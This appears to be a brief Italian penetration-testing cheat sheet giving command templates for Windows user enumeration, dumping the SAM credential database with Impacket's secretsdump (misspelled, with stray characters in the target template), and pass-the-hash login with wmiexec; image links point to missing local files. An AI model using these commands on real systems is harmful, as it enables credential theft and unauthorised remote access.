### **ENUMERAZIONE**
```powershell
net user <username>
```

![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png)

### **DUMP SAM DATABASE**
```bash
secrestdump.py <NOME DOMINIO>l/<USER>t@<IP>
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png)

Logga usando wmiexec e l'hash trovato
```bash
wmiexec.py <NOME DOMINIO>/<USER>@<IP> -hashes <HASH>
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png)